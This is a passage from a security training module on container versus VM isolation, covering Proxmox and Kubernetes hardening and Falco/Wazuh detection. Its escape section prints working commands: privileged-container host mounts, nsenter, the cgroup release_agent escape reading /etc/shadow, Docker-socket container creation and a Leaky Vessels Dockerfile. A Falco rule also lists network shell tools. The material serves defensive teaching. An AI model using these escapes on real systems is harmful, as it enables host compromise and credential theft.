- **Guest Physical Address → Host Physical Address** — translated by EPT/NPT, controlled exclusively by the hypervisor

A guest cannot map or access memory outside its EPT/NPT mappings. This is enforced in hardware — no software exploit within the guest can bypass it. The only attack path is through the hypervisor (which manages EPT/NPT) or through side channels.

### 3.4 I/O Isolation — IOMMU and VFIO

IOMMU (Intel VT-d, AMD-Vi) provides DMA isolation for PCI passthrough:

```bash
# Proxmox: Passthrough GPU with IOMMU isolation
qm set 100 --hostpci0 0000:01:00.0,pcie=1

# Verify IOMMU groups
find /sys/kernel/iommu_groups/ -type l | sort -t/ -k5 -n

# IOMMU ensures the passthrough device can only DMA to
# memory regions assigned to VM 100 by the hypervisor
```

Without IOMMU, a passthrough device could perform DMA to arbitrary host memory — a trivially exploitable guest-to-host escape. IOMMU is mandatory for secure PCI passthrough.

### 3.5 VM Introspection — LibVMI and DRAKVUF

VM introspection allows monitoring guest VM memory and behavior from outside the guest, making detection evasion significantly harder:

- **LibVMI**: Library for reading/writing guest VM memory from the host, using EPT/NPT mappings. Can reconstruct guest kernel data structures (process lists, loaded modules, network connections) without any agent inside the guest.
- **DRAKVUF**: Built on LibVMI, performs dynamic malware analysis by intercepting guest syscalls and API calls via EPT violations. The guest cannot detect or disable the monitoring because it operates below the hardware isolation boundary.

This capability has no equivalent in container environments — a compromised kernel can trivially disable or evade any monitoring running in the same kernel.

### 3.6 Live Patching — Ksplice, kpatch, kGraft

Hypervisor hosts can apply kernel security patches without rebooting:

```bash
# kpatch on Proxmox (Debian-based)
apt install kpatch

# Apply a livepatch
kpatch load /path/to/livepatch-module.ko

# Verify active patches
kpatch list
```

Live patching reduces the window of vulnerability for kernel CVEs without disrupting running VMs. This is particularly important for hypervisors where rebooting affects all hosted workloads.

---

## 4. Container Escape Techniques

### 4.1 Privileged Container Exploitation

A privileged container (`docker run --privileged`) disables nearly all security mechanisms:
- All capabilities granted
- No seccomp filtering
- No AppArmor/SELinux confinement
- `/dev` devices from the host are accessible
- cgroup restrictions relaxed

Escape from a privileged container is trivial:

```bash
# Method 1: Mount host filesystem
mkdir /host
mount /dev/sda1 /host
chroot /host

# Method 2: Load a kernel module
insmod /path/to/rootkit.ko

# Method 3: Access host cgroup
echo 1 > /proc/sys/kernel/sysrq
echo b > /proc/sysrq-trigger  # Reboot host

# Method 4: nsenter to host namespaces
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

**Rule: never use `--privileged` in production.** There is almost always a more specific capability or device mount that achieves the required functionality.

### 4.2 Capability Abuse

**CAP_SYS_ADMIN escape:**

```bash
# If container has CAP_SYS_ADMIN, mount a host device
# Enumerate available block devices
cat /proc/partitions
# Mount host root partition
mkdir /escape
mount /dev/sda1 /escape
# Read host /etc/shadow
cat /escape/etc/shadow
```

**CAP_SYS_PTRACE escape (with host PID namespace):**

```bash
# If container shares host PID namespace (--pid=host) and has CAP_SYS_PTRACE
# Inject shellcode into a host process
# Find a host process
ps aux | grep -v "container"
# Use process_vm_writev to inject code
python3 -c '
import ctypes, struct
libc = ctypes.CDLL("libc.so.6")
# ... ptrace POKETEXT into target process
'
```

**CAP_DAC_READ_SEARCH abuse (the "Shocker" attack):**

```c
// shocker.c — exploit CAP_DAC_READ_SEARCH to read any host file
// CVE-2014-3519 demonstrated this technique
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
// open_by_handle_at() bypasses normal permission checks
// when CAP_DAC_READ_SEARCH is available
// The attacker brute-forces file handles to read /etc/shadow on the host
```

### 4.3 Namespace Escape

**PID namespace escape — joining host PID namespace:**

If `/proc` from the host is accessible (misconfigured volume mount), an attacker can see host processes and potentially interact with them.

**Mount namespace escape:**

```bash
# If container has access to host's /proc/1/root
# (possible with --pid=host or /proc mounted from host)
ls -la /proc/1/root/
# This shows the host root filesystem
cat /proc/1/root/etc/shadow
```

**User namespace escape:**

User namespaces have been the source of numerous privilege escalation CVEs because they expose kernel attack surface (creating user namespaces allows access to features like `unshare` and `mount` that are normally restricted).

### 4.4 cgroup Escape — notify_on_release

The classic cgroup escape technique (pre-cgroup v2):

```bash
# Inside a container with CAP_SYS_ADMIN or write access to cgroup filesystem

# 1. Create a cgroup with notify_on_release enabled
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/escape

# 2. Set release_agent to a script on the host filesystem
echo 1 > /tmp/cgrp/escape/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 3. Write the payload
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd

# 4. Trigger release_agent execution
echo $$ > /tmp/cgrp/escape/cgroup.procs
# Kill the process to trigger notify_on_release
# The release_agent runs ON THE HOST as root
```

This technique requires `CAP_SYS_ADMIN` and write access to the cgroup filesystem. cgroup v2 with proper delegation mitigates this — the container's cgroup subtree does not allow setting `release_agent`.

### 4.5 Docker Socket Exploitation

If the Docker socket (`/var/run/docker.sock`) is mounted inside a container — a common but dangerous pattern for CI/CD pipelines — the container can control the Docker daemon with host-level root:

```bash
# Escape via Docker socket
# 1. Launch a new privileged container with host filesystem mounted
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H 'Content-Type: application/json' \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "cat /host/etc/shadow"],
    "HostConfig": {
      "Binds": ["/:/host"],
      "Privileged": true
    }
  }' | jq .Id

# 2. Start the container
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/<ID>/start

# 3. Read the output
curl -s --unix-socket /var/run/docker.sock \
  http://localhost/containers/<ID>/logs?stdout=true
```

**Mitigation:** Never mount Docker socket into containers. Use Docker-in-Docker with rootless mode, or use purpose-built tools like Kaniko for image builds.

### 4.6 Kernel Exploits from Container

**CVE-2022-0847 — Dirty Pipe:**

Affects Linux 5.8 through 5.16.10. Allows overwriting data in arbitrary files by exploiting a bug in the pipe buffer handling. A container process can overwrite files on the host filesystem (including `/etc/passwd`) because overlayfs uses the underlying host page cache:

```bash
# Dirty Pipe PoC (simplified concept)
# 1. Open a file (read-only through overlayfs)
# 2. Splice file data into a pipe
# 3. Write to the pipe — the PIPE_BUF_FLAG_CAN_MERGE flag
#    causes the write to overwrite the page cache
# 4. The underlying host file is now modified
# Result: container root → host root
```

**CVE-2016-5195 — Dirty COW:**

Race condition in the kernel's copy-on-write mechanism. Allows writing to read-only memory mappings, enabling privilege escalation from any user to root. Since containers share the host kernel, this gives container root → host root.

**CVE-2023-0386 — OverlayFS privilege escalation:**

OverlayFS (the default storage driver for Docker) has been a recurring source of container escapes. This CVE allowed unauthorized access to setuid files in the upper layer.

**CVE-2019-5736 — runc container escape:**

Allowed a malicious container to overwrite the host runc binary by exploiting `/proc/self/exe` handling. When runc was subsequently invoked, the attacker's code executed on the host with root privileges.

**CVE-2024-21626 — Leaky Vessels (runc):**

A set of vulnerabilities in runc's handling of file descriptors and working directory during container creation. Allowed a container image to specify a working directory that was a symlink to the host filesystem, leaking host file descriptors into the container:

```dockerfile
# Malicious Dockerfile exploiting CVE-2024-21626
WORKDIR /proc/self/fd/8
# This caused runc to set the container's CWD to a host filesystem path
# The container could then read/write host files
```

### 4.7 Container Breakout via Volume Mounts

Misconfigured volume mounts are one of the most common container escape vectors:

```bash
# Dangerous volume mounts — each is a potential escape
docker run -v /:/host                     # Full host filesystem
docker run -v /etc:/etc                   # Host configuration files
docker run -v /var/run/docker.sock:/var/run/docker.sock  # Docker daemon
docker run -v /proc:/host/proc            # Host process information
docker run -v /dev:/dev                   # Host devices

# Even read-only mounts can leak sensitive data
docker run -v /etc/shadow:/etc/shadow:ro  # Password hashes
docker run -v /root/.ssh:/root/.ssh:ro    # SSH keys
```

---

## 5. VM Escape Techniques

> For full technical analysis of VM escape exploits with code-level breakdowns, see Module 21 (VM Escape Attacks & Defenses). This section focuses on comparison with container escapes.

### 5.1 Virtual Device Exploitation

VM escapes predominantly target device emulation code — the complex software layer that translates guest I/O operations into host actions:

- **Network device emulation** — e1000, rtl8139, virtio-net: buffer overflows in packet handling (CVE-2015-5165 — QEMU RTL8139 heap overflow)
- **USB emulation** — EHCI, xHCI, USB redirection: complex state machines prone to use-after-free (CVE-2020-14364 — QEMU USB EHCI out-of-bounds access)
- **Graphics emulation** — VGA, virtio-gpu, SVGA: framebuffer operations, 3D acceleration (CVE-2017-2615 — QEMU Cirrus VGA heap overflow)
- **Storage emulation** — IDE, AHCI, virtio-blk, NVMe: read/write operations (CVE-2015-3456 — VENOM, floppy disk controller overflow)

Mitigation: use virtio (paravirtual) devices instead of full hardware emulation wherever possible. Virtio has a simpler codepath and smaller attack surface. Disable all unused device types.

### 5.2 Side-Channel Attacks

Side-channel attacks exploit shared microarchitectural state:

- **Cache timing** — Flush+Reload, Prime+Probe: infer cryptographic keys by measuring cache line access times
- **TLB attacks** — TLBleed: exploit shared TLB entries on SMT cores
- **Branch predictor** — Spectre variants: train branch predictor from one VM to speculatively execute in another
- **Memory deduplication** — KSM (Kernel Same-page Merging): detect presence of data in other VMs via page merge timing

Hardware mitigations: Intel SEV (Secure Encrypted Virtualization), AMD SEV-SNP, Intel TDX (Trust Domain Extensions) encrypt VM memory with per-VM keys, preventing even the hypervisor from reading guest memory.

### 5.3 Comparison — Container Escape vs VM Escape

| Dimension | Container Escape | VM Escape |
|-----------|-----------------|-----------|
| **Frequency** | Multiple per year (kernel CVEs) | ~1-3 per year (hypervisor CVEs) |
| **Difficulty** | Low to moderate — known kernel exploit → immediate escape | High — requires finding/chaining hypervisor bugs in emulation code |
| **Typical attack vector** | Kernel syscall exploitation, misconfig, capability abuse | Device emulation bugs (QEMU), management interface |
| **Required privileges** | Often achievable from unprivileged user inside container | Usually requires guest kernel/root access |
| **Blast radius** | All containers on host + host | All VMs on host + host |
| **Time to exploit** | Minutes (with known CVE + PoC) | Days to weeks (custom exploit development) |
| **Detection difficulty** | Moderate — syscall monitoring (Falco), kernel audit | High — hypervisor-level monitoring rare in production |
| **Exploit reliability** | High — kernel bugs often deterministic | Low-moderate — race conditions, heap layout dependent |
| **Remediation** | Kernel update + container restart | Hypervisor/QEMU update + VM restart |
| **Mitigation layers** | seccomp, caps, namespaces, MAC, rootless | EPT/NPT, IOMMU, device reduction, SEV/TDX |

The core message for security architects: **container isolation is defense-in-depth software mitigation; VM isolation is hardware-enforced boundary**. Choose accordingly based on threat model. Untrusted multi-tenant workloads demand VM (or microVM) isolation. Trusted, internally-developed microservices can use containers with proper hardening.

---

## 6. Proxmox Hybrid Deployments

### 6.1 LXC Containers on Proxmox — Security Configuration

Proxmox uses LXC (not Docker) for container workloads. LXC containers on Proxmox operate more like lightweight VMs than application containers — they run a full init system and can host multiple services.

**Unprivileged LXC container configuration (`/etc/pve/lxc/200.conf`):**

```
# Container 200 — Unprivileged, hardened web server
arch: amd64
cores: 2
memory: 2048
swap: 0
hostname: web-frontend
ostype: debian

# CRITICAL: unprivileged = 1 maps container UIDs to high-range host UIDs
unprivileged: 1

# User ID mapping: container UID 0 → host UID 100000
lxc.idmap: u 0 100000 65536
lxc.idmap: g 0 100000 65536

# Root filesystem — use subvolume, not bind mount
rootfs: local-zfs:subvol-200-disk-0,size=8G

# Networking — isolated VLAN
net0: name=eth0,bridge=vmbr1,firewall=1,hwaddr=BC:24:11:AA:BB:01,ip=10.10.20.10/24,gw=10.10.20.1,tag=20

# Security: AppArmor profile
lxc.apparmor.profile: generated

# Security: seccomp profile (Proxmox default blocks dangerous syscalls)
lxc.seccomp.profile: /usr/share/lxc/config/common.seccomp

# Deny access to dangerous /dev paths
lxc.cgroup2.devices.deny: a
lxc.cgroup2.devices.allow: c 1:3 rwm   # /dev/null
lxc.cgroup2.devices.allow: c 1:5 rwm   # /dev/zero
lxc.cgroup2.devices.allow: c 1:7 rwm   # /dev/full
lxc.cgroup2.devices.allow: c 1:8 rwm   # /dev/random
lxc.cgroup2.devices.allow: c 1:9 rwm   # /dev/urandom
lxc.cgroup2.devices.allow: c 5:0 rwm   # /dev/tty
lxc.cgroup2.devices.allow: c 5:1 rwm   # /dev/console
lxc.cgroup2.devices.allow: c 5:2 rwm   # /dev/ptmx
lxc.cgroup2.devices.allow: c 136:* rwm # /dev/pts/*

# Deny mount propagation to host
lxc.mount.auto: proc:rw sys:ro cgroup:mixed

# Drop all capabilities except what's needed
lxc.cap.drop: sys_admin sys_module sys_rawio sys_ptrace sys_boot \
              sys_nice sys_resource sys_time mac_admin mac_override \
              audit_control audit_read

# Resource limits
lxc.cgroup2.memory.max: 2147483648
lxc.cgroup2.cpu.max: 200000 100000
lxc.cgroup2.pids.max: 512

# Features — disable nesting, disable FUSE mount
features: nesting=0,fuse=0,keyctl=0

# Protection against accidental start during backup/migration
protection: 0

# Start on boot with delay
onboot: 1
startup: order=3,up=30
```

**Proxmox CLI commands for LXC hardening:**

```bash
# Create unprivileged container
pct create 200 local:vztmpl/debian-12-standard_12.7-1_amd64.tar.zst \
  --hostname web-frontend \
  --unprivileged 1 \
  --cores 2 --memory 2048 --swap 0 \
  --rootfs local-zfs:8 \
  --net0 name=eth0,bridge=vmbr1,firewall=1,tag=20,ip=10.10.20.10/24,gw=10.10.20.1 \
  --features nesting=0,fuse=0,keyctl=0

# Verify unprivileged status
pct config 200 | grep unprivileged

# Apply firewall rules
pct set 200 --firewall 1
```

### 6.2 KVM VMs on Proxmox — Security Configuration

**Hardened KVM VM configuration (`/etc/pve/qemu-server/100.conf`):**

```
# VM 100 — Hardened KVM database server
name: db-primary
agent: 1,fstrim_cloned_disks=1
balloon: 0
bios: ovmf
boot: order=scsi0
cores: 4
cpu: host,flags=+spec-ctrl;+ssbd;+md-clear;+aes
efidisk0: local-zfs:vm-100-disk-0,efitype=4m,pre-enrolled-keys=1,size=528K
hostpci0: 0000:03:00.0,pcie=1
machine: q35
memory: 8192
net0: virtio=BC:24:11:CC:DD:01,bridge=vmbr2,firewall=1,tag=30
numa: 1
onboot: 1
ostype: l26
scsi0: local-zfs:vm-100-disk-1,discard=on,iothread=1,size=64G,ssd=1
scsihw: virtio-scsi-single
serial0: socket
smbios1: uuid=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
sockets: 1
startup: order=1,up=60
tablet: 0
tpmstate0: local-zfs:vm-100-disk-2,size=4M,version=v2.0
vga: none
```

Key security settings explained:

- `bios: ovmf` + `efidisk0` — UEFI boot with Secure Boot (pre-enrolled keys)
- `tpmstate0` — vTPM 2.0 for measured boot and key sealing
- `cpu: host,flags=+spec-ctrl;+ssbd;+md-clear` — Enable Spectre/MDS mitigations in guest
- `machine: q35` — Modern chipset with PCIe support (fewer legacy devices, smaller attack surface)
- `vga: none` — No graphics emulation (headless server — eliminates VGA attack surface)
- `tablet: 0` — No USB tablet device (reduces USB emulation attack surface)
- `hostpci0: ...pcie=1` — IOMMU-isolated PCIe passthrough

### 6.3 When to Use LXC vs KVM — Security Decision Matrix

| Criterion | Use LXC (Container) | Use KVM (VM) |
|-----------|---------------------|--------------|
| Tenant trust level | Fully trusted (internal workloads) | Untrusted or semi-trusted |
| Kernel isolation requirement | Same kernel acceptable | Separate kernel required |
| Custom kernel needed | No | Yes (specific kernel version, modules) |
| Windows/non-Linux guest | Not possible | Required |
| Compliance requirement | Shared-kernel acceptable for scope | Separate scope per VM required |
| Performance sensitivity | I/O-intensive workloads benefit | Acceptable overhead (5-15%) |
| Density requirement | Hundreds of instances per node | Tens of instances per node |
| Attack surface tolerance | Accepts shared-kernel risk | Minimizes guest-to-host surface |
| Hardware passthrough | Not supported | Supported (GPU, NIC, NVMe) |
| Live migration security | UID mapping complexity | Encrypted migration available |
| Snapshot/backup granularity | Filesystem-level | Block-level + memory state |
| Exploit blast radius tolerance | All LXC containers on host exposed | Only compromised VM affected |

**Decision framework:**

```
Is the workload from an untrusted source?
  YES → KVM (full VM)
  NO ↓

Does it need a different kernel or non-Linux OS?
  YES → KVM (full VM)
  NO ↓

Does compliance require per-workload kernel isolation?
  YES → KVM (full VM)
  NO ↓

Is maximum density the priority over isolation strength?
  YES → LXC (unprivileged, hardened)
  NO → KVM (default safe choice)
```

### 6.4 Nesting — Containers Inside VMs

Running Docker or LXC containers inside a KVM VM provides defense-in-depth:

```
┌─────────────────────────────────────────┐
│  Proxmox Host                            │
│  ┌────────────────────────────────────┐  │
│  │  KVM VM (separate kernel)          │  │
│  │  ┌──────────┐  ┌──────────┐       │  │
│  │  │ Docker   │  │ Docker   │       │  │
│  │  │ Container│  │ Container│       │  │
│  │  └──────────┘  └──────────┘       │  │
│  │  Container escape → VM kernel      │  │
│  │  VM escape still needed for host   │  │
│  └────────────────────────────────────┘  │
└─────────────────────────────────────────┘
```

An attacker must chain two independent exploits: (1) container escape to VM kernel, then (2) VM escape to host hypervisor. This dramatically increases attack cost.

Proxmox configuration for VM with nesting:

```bash
# Enable nested virtualization on Proxmox host
echo "options kvm_intel nested=1" > /etc/modprobe.d/kvm-nested.conf
# OR for AMD:
echo "options kvm_amd nested=1" > /etc/modprobe.d/kvm-nested.conf

# VM config — CPU type must support VMX
qm set 100 --cpu host
# Inside the VM, install Docker as normal
```

### 6.5 Proxmox Firewall for Container and VM Traffic

Proxmox provides a three-level firewall: datacenter, host, and VM/container:

```bash
# /etc/pve/firewall/cluster.fw — Datacenter level
[OPTIONS]
enable: 1
policy_in: DROP
policy_out: ACCEPT
log_ratelimit: enabled=1,rate=1/second,burst=5

[RULES]
# Allow SSH to management only from admin VLAN
IN ACCEPT -source 10.10.10.0/24 -dest 10.10.0.0/24 -p tcp -dport 22
# Allow Proxmox web UI from admin VLAN
IN ACCEPT -source 10.10.10.0/24 -dest 10.10.0.0/24 -p tcp -dport 8006
# Drop all other inbound to management network
IN DROP -dest 10.10.0.0/24

# /etc/pve/firewall/100.fw — VM-level firewall
[OPTIONS]
enable: 1
policy_in: DROP
policy_out: ACCEPT
dhcp: 0
macfilter: 1
ipfilter: 1
log_level_in: warning

[RULES]
# Database server — only allow app VLAN
IN ACCEPT -source 10.10.20.0/24 -p tcp -dport 5432 -log warning
IN DROP -log err

# /etc/pve/firewall/200.fw — LXC container firewall (same syntax)
[OPTIONS]
enable: 1
policy_in: DROP
policy_out: ACCEPT
macfilter: 1
ipfilter: 1

[RULES]
IN ACCEPT -p tcp -dport 80
IN ACCEPT -p tcp -dport 443
IN DROP -log warning
```

Key difference: `macfilter` and `ipfilter` prevent MAC/IP spoofing from containers — critical because LXC containers share the host network stack more directly than VMs with virtio-net.

### 6.6 Resource Isolation Between Containers and VMs

On a shared Proxmox host running both LXC and KVM workloads:

```bash
# CPU isolation — pin VM cores to prevent container CPU contention
qm set 100 --cpuunits 2048 --cpulimit 4
pct set 200 --cpuunits 1024 --cpulimit 2

# Memory — disable balloon for security-sensitive VMs
qm set 100 --balloon 0 --memory 8192  # Fixed allocation
pct set 200 --memory 2048 --swap 0    # No swap for containers

# I/O throttling
qm set 100 --scsi0 local-zfs:vm-100-disk-1,mbps_rd=200,mbps_wr=100,iops_rd=5000,iops_wr=2500
pct set 200 --rootfs local-zfs:subvol-200-disk-0,size=8G
# LXC I/O limits via cgroup:
# lxc.cgroup2.io.max = 254:0 rbps=209715200 wbps=104857600

# Network — separate bridges for isolation
# VMs on vmbr2 (VLAN 30), LXC on vmbr1 (VLAN 20), management on vmbr0 (VLAN 10)
# No routing between VLANs without explicit firewall rules
```

---

## 7. Kubernetes on Virtual Infrastructure

### 7.1 K8s on VMs — Scheduling, Resource, and Security Implications

Running Kubernetes on virtual machines introduces a layered abstraction:

```
┌───────────────────────────────────────────────────────┐
│  Physical Host (Proxmox)                               │
│  ┌──────────────────────────────────────────────┐     │
│  │  KVM VM — K8s Worker Node                     │     │
│  │  ┌──────┐  ┌──────┐  ┌──────┐  ┌──────┐     │     │
│  │  │Pod A │  │Pod B │  │Pod C │  │Pod D │     │     │
│  │  └──────┘  └──────┘  └──────┘  └──────┘     │     │
│  │  containerd + runc / Kata / gVisor            │     │
│  │  VM Kernel (Linux 6.x)                        │     │
│  └──────────────────────────────────────────────┘     │
│  ┌──────────────────────────────────────────────┐     │
│  │  KVM VM — K8s Worker Node (second)            │     │
│  │  ...                                          │     │
│  └──────────────────────────────────────────────┘     │
│  Proxmox Hypervisor + KVM                              │
└───────────────────────────────────────────────────────┘
```

Security implications:
- **Scheduling**: K8s scheduler is unaware of the physical host topology. Two pods that should be isolated might land on the same VM, or two VMs on the same physical host. Use node affinity and pod anti-affinity for security-critical separation.
- **Resource**: VM resource limits are set in Proxmox; pod resource limits in K8s. Over-commitment at either layer can cause noisy-neighbor issues or OOM kills.
- **Network**: Pod-to-pod traffic within a VM stays in the VM kernel. Cross-VM pod traffic traverses the virtual switch. Network policies apply at the CNI level, while Proxmox firewall rules apply at the bridge level — both must be configured.

### 7.2 KubeVirt — Running VMs Inside Kubernetes

KubeVirt extends Kubernetes to manage VMs alongside containers using standard K8s primitives:

```yaml
apiVersion: kubevirt.io/v1
kind: VirtualMachineInstance
metadata:
  name: secure-legacy-app
  namespace: legacy-workloads
spec:
  domain:
    cpu:
      cores: 2
      dedicatedCpuPlacement: true
    memory:
      guest: 4Gi
    devices:
      disks:
        - name: rootdisk
          disk:
            bus: virtio
        - name: tpmdisk
          tpm: {}
      interfaces:
        - name: default
          masquerade: {}
      autoattachSerialConsole: false
      autoattachGraphicsDevice: false
    features:
      smm:
        enabled: true
    firmware:
      bootloader:
        efi:
          secureBoot: true
  networks:
    - name: default
      pod: {}
  volumes:
    - name: rootdisk
      persistentVolumeClaim:
        claimName: legacy-app-pvc
```

Security benefit: legacy workloads requiring full VM isolation can coexist with containerized workloads in the same K8s cluster, managed by the same RBAC, admission control, and network policies.

### 7.3 Kata Containers on K8s — Pod-Level VM Isolation

Kata Containers provide VM-level isolation for individual pods while maintaining OCI/CRI compatibility:

```yaml
# RuntimeClass for Kata Containers
apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata:
  name: kata-fc
handler: kata-fc  # Firecracker backend
overhead:
  podFixed:
    memory: "60Mi"
    cpu: "100m"
scheduling:
  nodeSelector:
    kata.io/runtime: "true"
---
# Pod using Kata runtime
apiVersion: v1
kind: Pod
metadata:
  name: untrusted-workload
  namespace: tenant-alpha
spec:
  runtimeClassName: kata-fc
  containers:
    - name: app
      image: registry.internal/tenant-alpha/app:v1.2.3
      resources:
        limits:
          memory: "512Mi"
          cpu: "500m"
      securityContext:
        readOnlyRootFilesystem: true
        runAsNonRoot: true
        runAsUser: 1000
        allowPrivilegeEscalation: false
        capabilities:
          drop: ["ALL"]
```

With Kata + Firecracker, each pod runs in its own microVM. A kernel exploit inside the pod affects only that pod's guest kernel — the host kernel is behind a hardware VMX boundary. This is the strongest isolation model available for Kubernetes workloads.

### 7.4 Confidential Containers — SEV/TDX for Pod Encryption

Confidential Containers (CoCo) encrypt pod memory using hardware mechanisms:

- **AMD SEV-SNP**: Encrypts VM memory with per-VM keys; the hypervisor cannot read guest memory. Provides integrity protection and attestation.
- **Intel TDX**: Trust Domains with hardware-enforced memory encryption and CPU state isolation. The TD (Trust Domain) runs with encrypted memory; a compromised hypervisor cannot read, modify, or replay TD memory.

```yaml
# Confidential Containers on K8s with TEE (example)
apiVersion: confidentialcontainers.org/v1beta1
kind: CcRuntime
metadata:
  name: cc-runtime-sev
spec:
  runtimeName: kata-cc-sev
  config:
    firmware: /opt/confidential-containers/share/ovmf/OVMF.fd
    hypervisor: qemu
    guestSEVEnabled: true
    guestSEVSNPEnabled: true
```

Use case: processing sensitive data (healthcare, financial) where even the infrastructure operator should not be able to access workload memory. The attestation chain verifies that the guest firmware, kernel, and runtime are unmodified before secrets are released.

### 7.5 Multi-Tenancy — VM-Level vs Namespace Isolation

| Isolation Mechanism | Tenant Escape Impact | Overhead | Management Complexity |
|---------------------|---------------------|----------|----------------------|
| K8s Namespace + NetworkPolicy | All tenants on same kernel | Minimal | Low |
| K8s Namespace + gVisor runtime | Syscall interception, partial kernel isolation | 5-30% | Medium |
| K8s Namespace + Kata runtime | Full VM boundary per pod | 10-50MB/pod, 1-3% CPU | Medium |
| Separate K8s cluster per tenant | Full cluster isolation | High (N clusters) | High |
| Virtual cluster (vcluster) | Shared data plane, isolated control plane | Moderate | Medium |
| Separate VM per tenant (KubeVirt) | Full VM boundary + separate OS | High | Medium-high |

For true multi-tenancy with untrusted workloads, namespace isolation alone is insufficient. Combine with Kata or gVisor at the pod level, network policies at the CNI level, and consider separate node pools per security tier.

### 7.6 Virtual Clusters for Strong Isolation

vcluster creates lightweight Kubernetes clusters inside namespaces of a host cluster:

```bash
# Install vcluster
vcluster create tenant-alpha --namespace tenant-alpha-ns

# Each vcluster gets:
# - Its own API server (synced to host cluster)
# - Its own controller manager
# - Isolated RBAC — tenant admins are cluster-admin in their vcluster
#   but have zero access to the host cluster
# - Pods still scheduled on host cluster nodes but in isolated namespaces
```

Security model: tenants can create CRDs, RBAC bindings, namespaces, and other cluster-scoped resources within their vcluster without affecting other tenants or the host cluster. The host cluster's admission controllers and network policies provide the enforcement layer.

---

## 8. Security Monitoring Across Hybrid

### 8.1 Unified Monitoring for Containers + VMs

The challenge: containers and VMs produce fundamentally different telemetry. Containers emit structured logs, container runtime events, and syscall traces. VMs emit syslog, kernel audit logs, and in-guest agent data. Correlating events across both requires a unified collection and normalization layer.

```
┌──────────────────────────────────────────────────────────┐
│                   SIEM / Correlation Layer                 │
│  (Wazuh Manager / Elasticsearch / Splunk / OpenSearch)    │
├────────────────────────┬─────────────────────────────────┤
│  Container Pipeline     │  VM Pipeline                     │
│  ┌──────────────┐      │  ┌──────────────┐               │
│  │   Falco      │      │  │  Wazuh Agent │               │
│  │  (eBPF/kmod) │      │  │  (in-guest)  │               │
│  ├──────────────┤      │  ├──────────────┤               │
│  │ Falco Sidekick│     │  │ auditd logs  │               │
│  │  → webhook/  │      │  │ syslog       │               │
│  │    kafka/     │      │  │ osquery      │               │
│  │    syslog     │      │  │ file integrity│              │
│  └──────────────┘      │  └──────────────┘               │
│         │              │         │                         │
│         ▼              │         ▼                         │
│  ┌────────────────────────────────────────────┐           │
│  │  Log Aggregation (Fluentd / Vector / Logstash)│        │
│  │  Normalization to common schema (ECS/OCSF)    │        │
│  └────────────────────────────────────────────┘           │
└──────────────────────────────────────────────────────────┘
```

### 8.2 Falco for Containers — Rules and Configuration

**Falco rule file for container security monitoring (`/etc/falco/rules.d/container-security.yaml`):**

```yaml
# Detect container escape attempts
- rule: Container Escape via Mount
  desc: >
    A process inside a container attempted to mount a filesystem,
    which could indicate an escape attempt via mount namespace manipulation.
  condition: >
    evt.type in (mount, umount2) and
    container.id != host and
    not fd.name startswith "/dev/pts" and
    not proc.name in (mount, umount)
  output: >
    Mount syscall in container (container=%container.name
    image=%container.image.repository command=%proc.cmdline
    user=%user.name mount_target=%evt.arg.target)
  priority: CRITICAL
  tags: [container, escape, mount]

- rule: Sensitive File Read in Container
  desc: >
    A process inside a container read /etc/shadow, /etc/passwd, or
    other sensitive host files (possible via volume mount misconfiguration).
  condition: >
    open_read and
    container.id != host and
    (fd.name = "/etc/shadow" or
     fd.name startswith "/proc/1/root" or
     fd.name startswith "/host/")
  output: >
    Sensitive file read in container (container=%container.name
    image=%container.image.repository file=%fd.name command=%proc.cmdline
    user=%user.name)
  priority: CRITICAL
  tags: [container, data_exfiltration]

- rule: Docker Socket Access in Container
  desc: >
    A process inside a container accessed the Docker daemon socket.
    This grants root-equivalent access to the host.
  condition: >
    (evt.type = connect or open_read or open_write) and
    container.id != host and
    fd.name = "/var/run/docker.sock"
  output: >
    Docker socket access from container (container=%container.name
    image=%container.image.repository command=%proc.cmdline
    user=%user.name)
  priority: CRITICAL
  tags: [container, escape, docker_socket]

- rule: Privileged Container Started
  desc: >
    A container was started with --privileged flag, disabling
    security mechanisms.
  condition: >
    container.privileged = true and
    evt.type = container
  output: >
    Privileged container started (container=%container.name
    image=%container.image.repository user=%user.name)
  priority: WARNING
  tags: [container, misconfiguration]

- rule: Unexpected Network Tool in Container
  desc: >
    Network reconnaissance tools executed inside a container.
  condition: >
    spawned_process and
    container.id != host and
    proc.name in (nmap, nc, ncat, netcat, socat, tcpdump, tshark, ping, traceroute, dig, nslookup, curl, wget) and
    not proc.pname in (healthcheck, monitoring-agent)
  output: >
    Network tool executed in container (container=%container.name
    image=%container.image.repository command=%proc.cmdline
    user=%user.name parent=%proc.pname)
  priority: WARNING
  tags: [container, reconnaissance]

- rule: Kernel Module Load Attempt from Container
  desc: >
    A process inside a container attempted to load a kernel module.
    This should be blocked by seccomp/capabilities but detection is critical.
  condition: >
    evt.type in (init_module, finit_module) and
    container.id != host
  output: >
    Kernel module load attempt from container (container=%container.name
    image=%container.image.repository command=%proc.cmdline
    user=%user.name module=%evt.arg.name)
  priority: CRITICAL
  tags: [container, escape, kernel_module]
```

### 8.3 Wazuh for VMs — Rules and Configuration

**Wazuh rules for VM security monitoring (`/var/ossec/etc/rules/vm-security.xml`):**

```xml
<group name="vm-security,">

  <!-- Detect VM escape indicators -->
  <rule id="100100" level="15">
    <if_group>syslog</if_group>
    <match>qemu|kvm|vmx|hypervisor</match>
    <match>segfault|overflow|corruption|violation</match>
    <description>Potential VM escape attempt — hypervisor process crash</description>
    <group>vm_escape,critical,</group>
  </rule>

  <!-- Detect QEMU process anomalies -->
  <rule id="100101" level="12">
    <if_sid>5100</if_sid>
    <program_name>qemu-system</program_name>
    <match>error|abort|assert</match>
    <description>QEMU process error — possible device exploitation attempt</description>
    <group>vm_security,high,</group>
  </rule>

  <!-- Detect unauthorized VM configuration changes -->
